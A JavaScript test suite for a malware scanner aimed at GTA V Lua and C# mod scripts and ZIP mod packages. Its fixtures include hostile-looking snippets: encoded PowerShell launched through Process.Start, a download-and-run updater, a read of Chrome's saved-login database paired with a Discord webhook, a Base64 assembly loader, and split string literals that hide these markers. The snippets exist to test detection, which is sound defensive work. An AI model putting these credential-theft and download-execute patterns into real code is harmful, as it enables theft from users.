'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { webcrypto } = require('crypto');

const ROOT = path.resolve(__dirname, '..');
const FIXTURES = path.join(__dirname, 'fixtures');

class FileLike {
  constructor(name, input, declaredSize) {
    this.name = name;
    this._bytes = Buffer.isBuffer(input) ? Buffer.from(input) : Buffer.from(input || '', 'utf8');
    this.size = declaredSize == null ? this._bytes.length : declaredSize;
  }
  async arrayBuffer() {
    return this._bytes.buffer.slice(this._bytes.byteOffset, this._bytes.byteOffset + this._bytes.byteLength);
  }
  slice(start, end) {
    return new FileLike(this.name, this._bytes.subarray(start || 0, end == null ? this._bytes.length : end));
  }
}

function fixtureFile(name, exposedName) {
  return new FileLike(exposedName || name, fs.readFileSync(path.join(FIXTURES, name)));
}

function makeContext() {
  const context = {
    console,
    TextDecoder,
    TextEncoder,
    crypto: webcrypto,
    performance,
    setTimeout,
    clearTimeout,
    ReadableStream,
    DecompressionStream,
    window: null,
  };
  context.window = context;
  vm.createContext(context);
  return context;
}

function load(context, filename) {
  const code = fs.readFileSync(path.join(ROOT, filename), 'utf8');
  vm.runInContext(code, context, { filename });
}

async function analyzerTests() {
  const c = makeContext();
  load(c, 'script-analyzer.js');
  const A = c.ScriptAnalyzer;

  // 1) normal benign Lua GTA-style script
  let r = await A.analyze(new FileLike('vehicle_menu.lua', `
    local menuOpen = false
    function onTick()
      if menuOpen then print("GTA V vehicle menu active") end
    end
  `));
  assert.equal(r.verdict, 'safe');
  assert.equal(r.language, 'lua');
  assert.equal(r.score, 100);

  // 2) normal benign C# GTA script
  r = await A.analyze(new FileLike('Speedometer.cs', `
    using GTA;
    public class Speedometer : Script {
      public Speedometer() { Tick += (s,e) => { var p = Game.Player.Character.Position; }; }
    }
  `));
  assert.equal(r.verdict, 'safe');
  assert.equal(r.language, 'csharp');

  // 3) one weak file API is not malicious
  r = await A.analyze(new FileLike('config.cs', `
    class C { string Read() { return File.ReadAllText("settings.ini"); } }
  `));
  assert.equal(r.verdict, 'safe');
  assert.ok(r.evidence.some(e => e.category === 'filesystem_access'));

  // 4) a single network API is not automatically malicious
  r = await A.analyze(new FileLike('status.cs', `
    class C { HttpClient client = new HttpClient(); }
  `));
  assert.notEqual(r.verdict, 'malicious');

  // 5) command execution + encoded PowerShell must not be SAFE
  r = await A.analyze(new FileLike('helper.cs', `
    class C { void Run() {
      var p = new ProcessStartInfo();
      p.FileName = "powershell.exe";
      p.Arguments = "-EncodedCommand SQBFAFgA";
      Process.Start(p);
    }}
  `));
  assert.notEqual(r.verdict, 'safe');
  assert.ok(r.evidence.filter(e => e.category === 'command_execution').length >= 2);

  // 6) downloader + execution must be at least suspicious
  r = await A.analyze(new FileLike('updater.cs', `
    using System.Net;
    using System.Diagnostics;
    class U { void Go() {
      var wc = new WebClient();
      wc.DownloadFile("https://example.invalid/update.bin", "update.bin");
      Process.Start("update.bin");
    }}
  `));
  assert.ok(r.verdict === 'suspicious' || r.verdict === 'malicious');
  assert.ok(r.combinationRulesFired.some(x => x.id === 'SC-COMBO-003'));

  // 7) credential theft + exfiltration is strong correlated evidence
  r = await A.analyze(new FileLike('steal.cs', `
    class S { void Go() {
      var db = File.ReadAllBytes("Chrome\\User Data\\Default\\Login Data");
      var hook = "https://discord.com/api/webhooks/123/token";
    }}
  `));
  assert.equal(r.verdict, 'malicious');
  assert.ok(r.combinationRulesFired.some(x => x.id === 'SC-COMBO-001'));

  // 8) encoded payload + dynamic assembly load is suspicious, not automatically malicious
  const blob = 'QUFB'.repeat(50);
  r = await A.analyze(new FileLike('loader.cs', `
    class L { void Go() {
      var b = Convert.FromBase64String("${blob}");
      Assembly.Load(b);
    }}
  `));
  assert.equal(r.verdict, 'suspicious');
  assert.ok(r.evidence.some(e => e.category === 'obfuscation'));
  assert.ok(r.evidence.some(e => e.category === 'dynamic_execution'));

  // 9) malicious-looking text in Lua comments alone must not trigger
  r = await A.analyze(new FileLike('commented.lua', `
    -- os.execute("powershell.exe -EncodedCommand AAAA")
    -- https://discord.com/api/webhooks/1/x
    print("normal")
  `));
  assert.equal(r.verdict, 'safe');
  assert.equal(r.evidence.length, 0);

  // 10) malicious-looking text in C# comments alone must not trigger
  r = await A.analyze(new FileLike('Commented.cs', `
    class C {
      // Process.Start("powershell.exe");
      /* https://discord.com/api/webhooks/1/x */
      void Tick() { }
    }
  `));
  assert.equal(r.verdict, 'safe');
  assert.equal(r.evidence.length, 0);

  // 11) adjacent C# string literals cannot hide a webhook endpoint
  r = await A.analyze(new FileLike('split_webhook.cs', `
    class C { string Hook = "https://dis" + "cord.com/api/webhooks/" + "123/TEST"; }
  `));
  assert.notEqual(r.verdict, 'safe');
  assert.ok(r.evidence.some(e => e.rule === 'SH-EXF-001'));

  // 12) adjacent literals cannot hide PowerShell encoded execution markers
  r = await A.analyze(new FileLike('split_powershell.cs', `
    class C { void Run() { var p = "po" + "wershell"; var a = "-enc"; } }
  `));
  assert.notEqual(r.verdict, 'safe');
  assert.ok(r.evidence.some(e => e.rule === 'CS-CMD-003'));
  assert.ok(r.evidence.some(e => e.rule === 'SH-OBF-002'));

  // 13) Lua command API alone is not enough for MALICIOUS
  r = await A.analyze(new FileLike('helper.lua', 'os.execute("echo gta")'));
  assert.notEqual(r.verdict, 'malicious');

  // 14) oversized script
  r = await A.analyze(new FileLike('huge.lua', 'print(1)', A.limits.MAX_SCRIPT_SIZE + 1));
  assert.equal(r.verdict, 'invalid');
  assert.equal(r.errorCode, 'too_large');

  // 15) binary file renamed to Lua
  r = await A.analyze(new FileLike('fake.lua', Buffer.from([0x4d,0x5a,0x00,0x03,0x00,0xff,0x10,0x00])));
  assert.equal(r.verdict, 'invalid');
  assert.equal(r.errorCode, 'binary_like_input');

  // 16) malformed UTF-8
  r = await A.analyze(new FileLike('broken.cs', Buffer.from([0x63,0x6c,0x61,0x73,0x73,0x20,0xc3,0x28])));
  assert.equal(r.verdict, 'invalid');
  assert.equal(r.errorCode, 'invalid_utf8');

  // 17) empty file
  r = await A.analyze(new FileLike('empty.lua', Buffer.alloc(0)));
  assert.equal(r.verdict, 'invalid');
  assert.equal(r.errorCode, 'empty_file');

  console.log('✓ ScriptAnalyzer: 17 tests passed');
}

async function directIntegrationTests() {
  const c = makeContext();
  load(c, 'malguard-contract.js');
  load(c, 'gta-mod-detector.js');
  load(c, 'script-analyzer.js');
  load(c, 'multilayer.js');
  load(c, 'archive-inspector.js');
  load(c, 'archive-entry-reader.js');
  c.MalGuardEngine = { version: '2.2.2' };

  let engineCalls = 0;
  c.scanFile = async () => {
    engineCalls++;
    return { verdict: 'safe', score: 100, hash: '0'.repeat(64), reasons: ['mock engine'], engineVersion: '2.2.2', rulesStatus: 'official' };
  };
  load(c, 'app.js');

  // Direct Lua Pro route uses ScriptAnalyzer, not PE Engine.
  let wrapped = await c.scanFileWithMode(new FileLike('menyoo_helper.lua', 'print("GTA V")'), 'pro');
  assert.equal(wrapped.mode, 'pro');
  assert.ok(wrapped.scriptAnalysis);
  assert.equal(wrapped.finalVerdict, 'safe');
  assert.equal(engineCalls, 0);

  // Direct suspicious C# source reaches ScriptAnalyzer.
  wrapped = await c.scanFileWithMode(new FileLike('gtav_updater.cs', `
    // GTA V helper
    class U { void G(){ var w=new WebClient(); w.DownloadString("https://example.invalid/x"); Process.Start("cmd.exe"); } }
  `), 'pro');
  assert.ok(wrapped.scriptAnalysis);
  assert.notEqual(wrapped.finalVerdict, 'safe');
  assert.equal(engineCalls, 0);

  // MZ/binary renamed to .lua is never SAFE; detector packaging raises it to suspicious.
  wrapped = await c.scanFileWithMode(new FileLike('gtav_mod.lua', Buffer.from([0x4d,0x5a,0x00,0x00,0x10,0x00,0xff,0x00])), 'pro');
  assert.ok(wrapped.scriptAnalysis);
  assert.equal(wrapped.finalVerdict, 'suspicious');
  assert.equal(engineCalls, 0);

  // Invalid mode must not silently downgrade to FREE.
  await assert.rejects(
    () => c.scanFileWithMode(new FileLike('test.asi', 'MZmock'), 'root'),
    err => err && err.code === 'INVALID_MODE'
  );
  assert.equal(engineCalls, 0);

  // Missing Pro MultiLayer must fail runtime attestation before any SAFE-capable scan.
  c.MultiLayerSecurity = undefined;
  wrapped = await c.scanFileWithMode(new FileLike('test.asi', 'MZmock'), 'pro');
  assert.equal(wrapped.finalVerdict, 'inconclusive');
  assert.equal(wrapped.hardeningError, 'multilayer_unavailable');
  assert.equal(engineCalls, 1);

  // FREE behavior remains direct Engine.
  wrapped = await c.scanFileWithMode(new FileLike('test.asi', 'MZmock'), 'free');
  assert.equal(wrapped.finalVerdict, 'safe');
  assert.equal(engineCalls, 2);

  console.log('✓ Direct app integration: 6 tests passed');
}

async function archiveIntegrationTests() {
  const c = makeContext();
  load(c, 'malguard-contract.js');
  load(c, 'gta-mod-detector.js');
  load(c, 'archive-inspector.js');
  load(c, 'archive-entry-reader.js');
  load(c, 'script-analyzer.js');
  c.MalGuardEngine = { version: '2.2.2' };

  // Engine should not be used by script-only fixtures.
  let engineCalls = 0;
  c.scanFile = async () => {
    engineCalls++;
    return { verdict: 'safe', score: 100, hash: '0'.repeat(64), reasons: ['mock engine'], errorCode: null, engineVersion: '2.2.2', rulesStatus: 'official' };
  };
  c.MultiLayerSecurity = { version: '1.0.0', analyze: r => ({ finalVerdict: r.verdict, gates: [] }) };
  load(c, 'app.js');

  // Inspector now emits explicit script target descriptors.
  let zip = fixtureFile('gtav-benign-scripts.zip', 'gtav-benign-scripts.zip');
  let inspection = await c.ArchiveInspector.inspect(zip);
  assert.equal(inspection.inspectionStatus, 'completed');
  assert.equal(inspection.scriptCount, 2);
  assert.equal(inspection.scriptTargetDescriptors.length, 2);
  assert.equal(inspection.pluginTargetDescriptors.length, 0);

  // Reader can safely extract a script descriptor and CRC-verifies it.
  let rr = await c.ArchiveEntryReader.readEntry(zip, inspection.scriptTargetDescriptors[0]);
  assert.equal(rr.ok, true);
  assert.equal(rr.crc32Verified, true);
  assert.ok(rr.file.name.endsWith('.lua') || rr.file.name.endsWith('.cs'));

  // Full Pro ZIP path analyzes both scripts and can conclude SAFE.
  let wrapped = await c.scanFileWithMode(zip, 'pro');
  assert.equal(wrapped.finalVerdict, 'safe');
  assert.equal(wrapped.archiveScriptResults.length, 2);
  assert.ok(wrapped.archiveScriptResults.every(x => x.finalVerdict === 'safe'));
  assert.equal(engineCalls, 0);

  // Strong malicious script inside ZIP propagates to package verdict.
  zip = fixtureFile('gtav-malicious-script.zip', 'gtav-malicious-script.zip');
  wrapped = await c.scanFileWithMode(zip, 'pro');
  assert.equal(wrapped.finalVerdict, 'malicious');
  assert.equal(wrapped.archiveScriptResults.length, 1);
  assert.equal(wrapped.archiveScriptResults[0].finalVerdict, 'malicious');
  assert.equal(engineCalls, 0);

  // Traversal path never becomes a script target and package is not SAFE.
  zip = fixtureFile('gtav-ambiguous-script.zip', 'gtav-ambiguous-script.zip');
  inspection = await c.ArchiveInspector.inspect(zip);
  assert.equal(inspection.scriptCount, 1);
  assert.equal(inspection.scriptTargetDescriptors.length, 0);
  assert.ok(inspection.suspiciousPathCount > 0);
  wrapped = await c.scanFileWithMode(zip, 'pro');
  assert.notEqual(wrapped.finalVerdict, 'safe');

  console.log('✓ ZIP ScriptAnalyzer integration: 6 tests passed');
}

(async () => {
  await analyzerTests();
  await directIntegrationTests();
  await archiveIntegrationTests();
  console.log('✓ All MalGuard Script Analyzer v1.0.0 tests passed (25 assertions groups)');
})().catch(err => {
  console.error(err && err.stack ? err.stack : err);
  process.exit(1);
});
